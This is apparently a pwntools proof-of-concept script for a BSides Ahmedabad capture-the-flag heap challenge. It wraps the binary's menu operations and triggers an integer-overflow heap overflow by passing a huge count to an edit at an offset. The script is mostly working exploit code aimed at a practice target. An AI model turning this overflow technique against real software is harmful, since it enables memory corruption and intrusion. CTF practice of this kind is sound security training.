# This was a nice compiler optimization induced bug, hint try `strings chall | grep "Integer overflow"`
from pwn import *

elf = ELF("./chall")
libc = elf.libc

target = process([elf.path])
#target = remote("pwn.bsidesahmedabad.in", 9003)

def sla(s, d):
	target.sendlineafter(s, str(d))

def create(idx, size, content):
	sla(":", 1)
	sla(":", idx)
	sla(":", size)
	sla(":", content)

def edit(idx, offset, count, content):
	sla(":", 2)
	sla(":", idx)
	sla(":", offset)
	sla(":", count)
	sla(":", content)

def prnt(idx):
	sla(":", 3)
	sla(":", idx)
	target.recvuntil(": ")
	print target.recvline().strip()

def delete(idx):
	sla(":", 4)
	sla(":", idx)

# POC
create(1, 0x10, "WALL")
edit(1, 8, 0x80000000-7, "A"*0x60)

#gdb.attach(target, 'heap chunks\n heap bins')

target.interactive()
